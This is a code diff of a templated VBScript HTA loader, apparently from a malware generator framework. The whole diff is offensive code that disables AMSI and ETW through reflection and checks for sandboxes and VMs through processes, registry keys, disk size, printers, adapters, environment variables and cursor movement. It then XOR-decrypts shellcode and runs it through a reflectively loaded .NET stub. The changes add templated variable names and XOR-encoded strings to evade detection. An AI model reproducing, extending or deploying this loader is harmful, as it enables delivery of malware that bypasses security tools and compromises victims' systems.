@@ -19,12 +19,20 @@ Function {{ v.fn_build_str }}(a)
     {{ v.fn_build_str }} = s
 End Function
 
+Function {{ v.fn_hex2arr }}(h)
+    Dim n: n = Len(h) \ 2
+    Dim a(): ReDim a(0 To n - 1)
+    Dim i
+    For i = 0 To n - 1: a(i) = CInt("&H" & Mid(h, i * 2 + 1, 2)): Next
+    {{ v.fn_hex2arr }} = a
+End Function
+
 Sub {{ v.fn_amsi }}()
     On Error Resume Next
     Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     Dim amsiT: Set amsiT = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
     If Not amsiT Is Nothing Then
-        amsiT.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), 36).SetValue Nothing, True
+        amsiT.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), (4 Or 32)).SetValue Nothing, True
     End If
 End Sub
 
@@ -33,7 +41,7 @@ Sub {{ v.fn_etw }}()
     Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     Dim t: Set t = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
     If Not t Is Nothing Then
-        Dim fi: Set fi = t.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), 36)
+        Dim fi: Set fi = t.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), (4 Or 32))
         If Not fi Is Nothing Then fi.SetValue Nothing, 0
     End If
 End Sub
@@ -42,85 +50,90 @@ Function {{ v.fn_sandbox }}()
     {{ v.fn_sandbox }} = False
     On Error Resume Next
     If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
-    Dim wmi: Set wmi = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
-    Dim procs: Set procs = wmi.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_proc_q }})))
-    Dim badList: badList = Split({{ v.fn_build_str }}(Array({{ v.jsc_vm_procs }})), "|")
-    Dim p, j
-    For Each p In procs
-        Dim pn: pn = LCase(p.Name)
-        For j = 0 To UBound(badList)
-            If pn = badList(j) Then {{ v.fn_sandbox }} = True: Exit Function
+    Dim {{ v.hta_lv_wmi }}: Set {{ v.hta_lv_wmi }} = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
+    Dim {{ v.hta_lv_procs }}: Set {{ v.hta_lv_procs }} = {{ v.hta_lv_wmi }}.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_proc_q }})))
+    Dim {{ v.hta_lv_badlist }}: {{ v.hta_lv_badlist }} = Split({{ v.fn_build_str }}(Array({{ v.jsc_vm_procs }})), "|")
+    Dim {{ v.hta_lv_p }}, {{ v.hta_lv_jcnt }}
+    For Each {{ v.hta_lv_p }} In {{ v.hta_lv_procs }}
+        Dim {{ v.hta_lv_pn }}: {{ v.hta_lv_pn }} = LCase({{ v.hta_lv_p }}.Name)
+        For {{ v.hta_lv_jcnt }} = 0 To UBound({{ v.hta_lv_badlist }})
+            If {{ v.hta_lv_pn }} = {{ v.hta_lv_badlist }}({{ v.hta_lv_jcnt }}) Then {{ v.fn_sandbox }} = True: Exit Function
         Next
     Next
-    ' VM registry checks (paths obfuscated via fn_build_str)
     On Error Resume Next
-    Dim sh: Set sh = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }})))
-    sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104))
+    Dim {{ v.hta_lv_sh }}: Set {{ v.hta_lv_sh }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }})))
+    Dim {{ v.hta_lv_vmr }}({{ vba_vmware_reg_len }})
+    {% for b in vba_vmware_reg_enc %}{{ v.hta_lv_vmr }}({{ loop.index0 }})={{ b }}
+    {% endfor %}Dim {{ v.hta_lv_vmi }}
+    For {{ v.hta_lv_vmi }} = 0 To {{ vba_vmware_reg_len }}: {{ v.hta_lv_vmr }}({{ v.hta_lv_vmi }}) = {{ v.hta_lv_vmr }}({{ v.hta_lv_vmi }}) Xor {{ vba_vmware_reg_xk }}: Next
+    {{ v.hta_lv_sh }}.RegRead {{ v.fn_build_str }}({{ v.hta_lv_vmr }})
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Err.Clear
-    sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,79,114,97,99,108,101,92,86,105,114,116,117,97,108,66,111,120,32,71,117,101,115,116,32,65,100,100,105,116,105,111,110,115,92,86,101,114,115,105,111,110))
+    Dim {{ v.hta_lv_vbr }}({{ vba_vbox_reg_len }})
+    {% for b in vba_vbox_reg_enc %}{{ v.hta_lv_vbr }}({{ loop.index0 }})={{ b }}
+    {% endfor %}For {{ v.hta_lv_vmi }} = 0 To {{ vba_vbox_reg_len }}: {{ v.hta_lv_vbr }}({{ v.hta_lv_vmi }}) = {{ v.hta_lv_vbr }}({{ v.hta_lv_vmi }}) Xor {{ vba_vbox_reg_xk }}: Next
+    {{ v.hta_lv_sh }}.RegRead {{ v.fn_build_str }}({{ v.hta_lv_vbr }})
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Err.Clear
-    Dim fso2, drv2
-    Set fso2 = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_fs_obj }})))
+    Dim {{ v.hta_lv_fso }}, {{ v.hta_lv_drv }}
+    Set {{ v.hta_lv_fso }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_fs_obj }})))
     On Error Resume Next
-    Set drv2 = fso2.GetDrive("C:")
+    Set {{ v.hta_lv_drv }} = {{ v.hta_lv_fso }}.GetDrive("C:")
     If Err.Number = 0 Then
-        If drv2.TotalSize < 53687091200 Then {{ v.fn_sandbox }} = True: Set fso2 = Nothing: Exit Function
+        If {{ v.hta_lv_drv }}.TotalSize < 53687091200 Then {{ v.fn_sandbox }} = True: Set {{ v.hta_lv_fso }} = Nothing: Exit Function
     End If
     On Error GoTo 0
-    Set fso2 = Nothing
+    Set {{ v.hta_lv_fso }} = Nothing
     On Error Resume Next
-    Dim wmiPrt, printers, prtCount
-    Set wmiPrt = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
+    Dim {{ v.hta_lv_wmiprt }}, {{ v.hta_lv_printers }}, {{ v.hta_lv_prtcnt }}
+    Set {{ v.hta_lv_wmiprt }} = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     If Err.Number = 0 Then
-        Set printers = wmiPrt.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_printer_q }})))
-        prtCount = 0
-        Dim oPrt
-        For Each oPrt In printers: prtCount = prtCount + 1: Next
-        If prtCount = 0 Then {{ v.fn_sandbox }} = True: Set wmiPrt = Nothing: Exit Function
+        Set {{ v.hta_lv_printers }} = {{ v.hta_lv_wmiprt }}.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_printer_q }})))
+        {{ v.hta_lv_prtcnt }} = 0
+        Dim {{ v.hta_lv_oprt }}
+        For Each {{ v.hta_lv_oprt }} In {{ v.hta_lv_printers }}: {{ v.hta_lv_prtcnt }} = {{ v.hta_lv_prtcnt }} + 1: Next
+        If {{ v.hta_lv_prtcnt }} = 0 Then {{ v.fn_sandbox }} = True: Set {{ v.hta_lv_wmiprt }} = Nothing: Exit Function
     End If
     On Error GoTo 0
-    Set wmiPrt = Nothing
+    Set {{ v.hta_lv_wmiprt }} = Nothing
     On Error Resume Next
-    Dim wmiNa, naQ, naCnt
-    Set wmiNa = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
+    Dim {{ v.hta_lv_wmina }}, {{ v.hta_lv_naq }}, {{ v.hta_lv_nacnt }}
+    Set {{ v.hta_lv_wmina }} = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     If Err.Number = 0 Then
-        Set naQ = wmiNa.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_mac_q }})))
-        naCnt = 0
-        Dim oNa
-        For Each oNa In naQ: naCnt = naCnt + 1: Next
-        If naCnt < 2 Then {{ v.fn_sandbox }} = True: Set wmiNa = Nothing: Exit Function
+        Set {{ v.hta_lv_naq }} = {{ v.hta_lv_wmina }}.ExecQuery({{ v.fn_build_str }}(Array({{ v.jsc_wmi_mac_q }})))
+        {{ v.hta_lv_nacnt }} = 0
+        Dim {{ v.hta_lv_ona }}
+        For Each {{ v.hta_lv_ona }} In {{ v.hta_lv_naq }}: {{ v.hta_lv_nacnt }} = {{ v.hta_lv_nacnt }} + 1: Next
+        If {{ v.hta_lv_nacnt }} < 2 Then {{ v.fn_sandbox }} = True: Set {{ v.hta_lv_wmina }} = Nothing: Exit Function
     End If
     On Error GoTo 0
-    Set wmiNa = Nothing
+    Set {{ v.hta_lv_wmina }} = Nothing
     On Error Resume Next
-    Dim _venv: Set _venv = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }}))).Environment("Process")
-    If _venv({{ v.fn_build_str }}(Array({{ v.jsc_env_vbox }}))) <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
-    If _venv({{ v.fn_build_str }}(Array({{ v.jsc_env_sandboxie }}))) <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
-    Set _venv = Nothing
+    Dim {{ v.hta_lv_venv }}: Set {{ v.hta_lv_venv }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }}))).Environment("Process")
+    If {{ v.hta_lv_venv }}({{ v.fn_build_str }}(Array({{ v.jsc_env_vbox }}))) <> "" Then {{ v.fn_sandbox }} = True: Set {{ v.hta_lv_venv }} = Nothing: Exit Function
+    If {{ v.hta_lv_venv }}({{ v.fn_build_str }}(Array({{ v.jsc_env_sandboxie }}))) <> "" Then {{ v.fn_sandbox }} = True: Set {{ v.hta_lv_venv }} = Nothing: Exit Function
+    Set {{ v.hta_lv_venv }} = Nothing
     On Error GoTo 0
 End Function
 
 Sub {{ v.sub_run }}()
     If {{ v.fn_sandbox }}() Then self.close: Exit Sub
-    ' Record cursor position before delay; check movement after — no extra wait
-    Dim _cx0, _cy0, _gotCur
-    _cx0 = -999: _cy0 = -999: _gotCur = False
+    Dim {{ v.hta_lv_cx }}, {{ v.hta_lv_cy }}, {{ v.hta_lv_gotcur }}
+    {{ v.hta_lv_cx }} = -999: {{ v.hta_lv_cy }} = -999: {{ v.hta_lv_gotcur }} = False
     On Error Resume Next
-    Dim _ca: Set _ca = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
+    Dim {{ v.hta_lv_ca }}: Set {{ v.hta_lv_ca }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     If Err.Number = 0 Then
-        Dim _wf: Set _wf = _ca.LoadWithPartialName({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms }})))
-        If Err.Number = 0 And Not IsNull(_wf) And Not IsEmpty(_wf) Then
-            Dim _ct: Set _ct = _wf.GetType({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms_cur }})))
-            If Err.Number = 0 And Not IsNull(_ct) Then
-                Dim _pp: Set _pp = _ct.GetProperty({{ v.fn_build_str }}(Array({{ v.jsc_cursor_position }})), 24)
-                If Err.Number = 0 And Not IsNull(_pp) Then
-                    Dim _ps: Set _ps = _pp.GetValue(Nothing, Nothing)
-                    If Err.Number = 0 And Not IsNull(_ps) Then
-                        _cx0 = _ps.GetType().GetProperty({{ v.fn_build_str }}(Array(88))).GetValue(_ps, Nothing)
-                        _cy0 = _ps.GetType().GetProperty({{ v.fn_build_str }}(Array(89))).GetValue(_ps, Nothing)
-                        If Err.Number = 0 Then _gotCur = True
+        Dim {{ v.hta_lv_wf }}: Set {{ v.hta_lv_wf }} = {{ v.hta_lv_ca }}.LoadWithPartialName({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms }})))
+        If Err.Number = 0 And Not IsNull({{ v.hta_lv_wf }}) And Not IsEmpty({{ v.hta_lv_wf }}) Then
+            Dim {{ v.hta_lv_ct }}: Set {{ v.hta_lv_ct }} = {{ v.hta_lv_wf }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms_cur }})))
+            If Err.Number = 0 And Not IsNull({{ v.hta_lv_ct }}) Then
+                Dim {{ v.hta_lv_pp }}: Set {{ v.hta_lv_pp }} = {{ v.hta_lv_ct }}.GetProperty({{ v.fn_build_str }}(Array({{ v.jsc_cursor_position }})), 24)
+                If Err.Number = 0 And Not IsNull({{ v.hta_lv_pp }}) Then
+                    Dim {{ v.hta_lv_ps }}: Set {{ v.hta_lv_ps }} = {{ v.hta_lv_pp }}.GetValue(Nothing, Nothing)
+                    If Err.Number = 0 And Not IsNull({{ v.hta_lv_ps }}) Then
+                        {{ v.hta_lv_cx }} = {{ v.hta_lv_ps }}.GetType().GetProperty({{ v.fn_build_str }}(Array(88))).GetValue({{ v.hta_lv_ps }}, Nothing)
+                        {{ v.hta_lv_cy }} = {{ v.hta_lv_ps }}.GetType().GetProperty({{ v.fn_build_str }}(Array(89))).GetValue({{ v.hta_lv_ps }}, Nothing)
+                        If Err.Number = 0 Then {{ v.hta_lv_gotcur }} = True
                     End If
                 End If
             End If
@@ -128,27 +141,25 @@ Sub {{ v.sub_run }}()
     End If
     Err.Clear
     On Error GoTo 0
-    ' Brief execution delay (defeats fast sandbox timeouts)
-    Dim t0: t0 = Timer
-    Do While Timer - t0 < 2 + Rnd * 3: Loop
-    ' Cursor check: if position unchanged over the delay, treat as sandbox
-    If _gotCur Then
+    Dim {{ v.hta_lv_t0 }}: {{ v.hta_lv_t0 }} = Timer
+    Do While Timer - {{ v.hta_lv_t0 }} < 2 + Rnd * 3: Loop
+    If {{ v.hta_lv_gotcur }} Then
         On Error Resume Next
-        Dim _ca2: Set _ca2 = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
+        Dim {{ v.hta_lv_ca2 }}: Set {{ v.hta_lv_ca2 }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
         If Err.Number = 0 Then
-            Dim _wf2: Set _wf2 = _ca2.LoadWithPartialName({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms }})))
-            If Err.Number = 0 And Not IsNull(_wf2) And Not IsEmpty(_wf2) Then
-                Dim _ct2: Set _ct2 = _wf2.GetType({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms_cur }})))
-                If Err.Number = 0 And Not IsNull(_ct2) Then
-                    Dim _pp2: Set _pp2 = _ct2.GetProperty({{ v.fn_build_str }}(Array({{ v.jsc_cursor_position }})), 24)
-                    If Err.Number = 0 And Not IsNull(_pp2) Then
-                        Dim _ps2: Set _ps2 = _pp2.GetValue(Nothing, Nothing)
-                        If Err.Number = 0 And Not IsNull(_ps2) Then
-                            Dim _cx2, _cy2
-                            _cx2 = _ps2.GetType().GetProperty({{ v.fn_build_str }}(Array(88))).GetValue(_ps2, Nothing)
-                            _cy2 = _ps2.GetType().GetProperty({{ v.fn_build_str }}(Array(89))).GetValue(_ps2, Nothing)
+            Dim {{ v.hta_lv_wf2 }}: Set {{ v.hta_lv_wf2 }} = {{ v.hta_lv_ca2 }}.LoadWithPartialName({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms }})))
+            If Err.Number = 0 And Not IsNull({{ v.hta_lv_wf2 }}) And Not IsEmpty({{ v.hta_lv_wf2 }}) Then
+                Dim {{ v.hta_lv_ct2 }}: Set {{ v.hta_lv_ct2 }} = {{ v.hta_lv_wf2 }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_sys_win_forms_cur }})))
+                If Err.Number = 0 And Not IsNull({{ v.hta_lv_ct2 }}) Then
+                    Dim {{ v.hta_lv_pp2 }}: Set {{ v.hta_lv_pp2 }} = {{ v.hta_lv_ct2 }}.GetProperty({{ v.fn_build_str }}(Array({{ v.jsc_cursor_position }})), 24)
+                    If Err.Number = 0 And Not IsNull({{ v.hta_lv_pp2 }}) Then
+                        Dim {{ v.hta_lv_ps2 }}: Set {{ v.hta_lv_ps2 }} = {{ v.hta_lv_pp2 }}.GetValue(Nothing, Nothing)
+                        If Err.Number = 0 And Not IsNull({{ v.hta_lv_ps2 }}) Then
+                            Dim {{ v.hta_lv_cx2 }}, {{ v.hta_lv_cy2 }}
+                            {{ v.hta_lv_cx2 }} = {{ v.hta_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}(Array(88))).GetValue({{ v.hta_lv_ps2 }}, Nothing)
+                            {{ v.hta_lv_cy2 }} = {{ v.hta_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}(Array(89))).GetValue({{ v.hta_lv_ps2 }}, Nothing)
                             If Err.Number = 0 Then
-                                If _cx0 = _cx2 And _cy0 = _cy2 Then self.close: Exit Sub
+                                If {{ v.hta_lv_cx }} = {{ v.hta_lv_cx2 }} And {{ v.hta_lv_cy }} = {{ v.hta_lv_cy2 }} Then self.close: Exit Sub
                             End If
                         End If
                     End If
@@ -161,33 +172,33 @@ Sub {{ v.sub_run }}()
     Call {{ v.fn_amsi }}()
     Call {{ v.fn_etw }}()
 
-    Dim sc_hex, key_hex
-    sc_hex  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
-    key_hex = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
+    Dim {{ v.hta_lv_schex }}, {{ v.hta_lv_keyhex }}
+    {{ v.hta_lv_schex }}  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
+    {{ v.hta_lv_keyhex }} = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
 
-    Dim _k()
-    _k = {{ v.fn_hex2arr }}(key_hex)
-    Dim _ki
-    For _ki = 0 To UBound(_k): _k(_ki) = _k(_ki) Xor {{ key_tweak }}: Next
+    Dim {{ v.hta_lv_k }}()
+    {{ v.hta_lv_k }} = {{ v.fn_hex2arr }}({{ v.hta_lv_keyhex }})
+    Dim {{ v.hta_lv_ki }}
+    For {{ v.hta_lv_ki }} = 0 To UBound({{ v.hta_lv_k }}): {{ v.hta_lv_k }}({{ v.hta_lv_ki }}) = {{ v.hta_lv_k }}({{ v.hta_lv_ki }}) Xor {{ key_tweak }}: Next
 
-    Dim sc(), i
-    ReDim sc(Len(sc_hex) / 2 - 1)
-    For i = 0 To Len(sc_hex) / 2 - 1
-        sc(i) = CInt("&H" & Mid(sc_hex, i * 2 + 1, 2)) Xor _
-                _k(i Mod (UBound(_k) + 1))
+    Dim {{ v.hta_lv_sc }}(), {{ v.hta_lv_lcnt }}
+    ReDim {{ v.hta_lv_sc }}(Len({{ v.hta_lv_schex }}) / 2 - 1)
+    For {{ v.hta_lv_lcnt }} = 0 To Len({{ v.hta_lv_schex }}) / 2 - 1
+        {{ v.hta_lv_sc }}({{ v.hta_lv_lcnt }}) = CInt("&H" & Mid({{ v.hta_lv_schex }}, {{ v.hta_lv_lcnt }} * 2 + 1, 2)) Xor _
+                {{ v.hta_lv_k }}({{ v.hta_lv_lcnt }} Mod (UBound({{ v.hta_lv_k }}) + 1))
     Next
 
-    Dim loader: Set loader = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
-    Dim stub_hex: stub_hex = "{{ dotnet_stub_hex }}"
-    Dim stub_bytes(): ReDim stub_bytes(Len(stub_hex) / 2 - 1)
-    For i = 0 To Len(stub_hex) / 2 - 1
-        stub_bytes(i) = CInt("&H" & Mid(stub_hex, i * 2 + 1, 2))
+    Dim {{ v.hta_lv_loader }}: Set {{ v.hta_lv_loader }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
+    Dim {{ v.hta_lv_stubhex }}: {{ v.hta_lv_stubhex }} = "{{ dotnet_stub_hex }}"
+    Dim {{ v.hta_lv_stubbytes }}(): ReDim {{ v.hta_lv_stubbytes }}(Len({{ v.hta_lv_stubhex }}) / 2 - 1)
+    For {{ v.hta_lv_lcnt }} = 0 To Len({{ v.hta_lv_stubhex }}) / 2 - 1
+        {{ v.hta_lv_stubbytes }}({{ v.hta_lv_lcnt }}) = CInt("&H" & Mid({{ v.hta_lv_stubhex }}, {{ v.hta_lv_lcnt }} * 2 + 1, 2))
     Next
 
-    Dim asm: Set asm = loader.Load((stub_bytes))
-    Dim t:   Set t   = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_stub_loader }})))
-    Dim mi:  Set mi  = t.GetMethod({{ v.fn_build_str }}(Array({{ v.jsc_stub_run }})))
-    mi.Invoke Nothing, Array((sc))
+    Dim {{ v.hta_lv_asm }}: Set {{ v.hta_lv_asm }} = {{ v.hta_lv_loader }}.Load(({{ v.hta_lv_stubbytes }}))
+    Dim {{ v.hta_lv_t }}:   Set {{ v.hta_lv_t }}   = {{ v.hta_lv_asm }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_stub_loader }})))
+    Dim {{ v.hta_lv_mi }}:  Set {{ v.hta_lv_mi }}  = {{ v.hta_lv_t }}.GetMethod({{ v.fn_build_str }}(Array({{ v.jsc_stub_run }})))
+    {{ v.hta_lv_mi }}.Invoke Nothing, Array(({{ v.hta_lv_sc }}))
     self.close
 End Sub
 
